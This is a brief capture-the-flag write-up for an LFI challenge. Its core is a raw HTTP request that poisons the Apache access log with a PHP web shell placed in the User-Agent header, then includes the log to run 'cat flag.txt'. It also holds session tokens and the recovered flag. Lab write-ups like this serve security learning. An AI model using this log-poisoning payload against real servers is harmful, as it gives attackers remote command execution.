# Web03 - 02: LFI

This ctf is abound `LFI`.
We know it is an apache server so we can exploit the apache cmd execution method.
My request in burp:
```
GET /?file=/var/log/apache2/access.log&cmd=cat+flag.txt HTTP/1.1
Host: algolymp.learn-it.org:30019
User-Agent: <?php system($_GET['cmd'])?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: X-SESSION-COOKIE=68a58cd970b1eace4cc0a7e533c964ee31629d36f03a681baa28a9b3c87ffaf4.9d3ebc6470ca63130d141d4ee44fc4e4193753faefc9dd9ed65d12bcfa1f3e50; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYm9ibyIsImlhdCI6MTc3NTU4ODgzMSwiZXhwIjoxNzc1NTkyNDMxfQ.In1DG4i3BkLm4I0lZf8qXnZ9Mux6keiefRkJ0vRT1sg
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
With this request I was able to get the flag since the file `/var/log/apache2/access.log` can execute commands with placed in the param cmd.

flag: `ALGOLYMP{rce_through_lfi}`